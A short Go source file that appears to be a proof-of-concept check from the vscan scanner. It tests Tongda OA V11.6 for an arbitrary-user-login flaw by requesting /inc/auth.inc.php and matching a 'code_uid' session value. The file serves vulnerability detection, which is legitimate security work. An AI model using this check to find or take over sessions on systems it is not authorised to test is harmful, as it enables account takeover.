package tongda

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
)

//version 通达 OA V11.6 任意用户登陆
func Get_user_session(url string) bool{


	if req, err:=pkg.HttpRequset(url+"/inc/auth.inc.php","GET","",false,nil); err == nil {
		re,_:= regexp.Match("\"code_uid\":\"{.*?}\"",[]byte(req.Body))
		if re{
			pkg.GoPocLog(fmt.Sprintf("Found vuln tongda-OA any_user_Login | \"%s\"\n", "you can use session to login"))
			return true
		}

		return false
	}

	return false
}
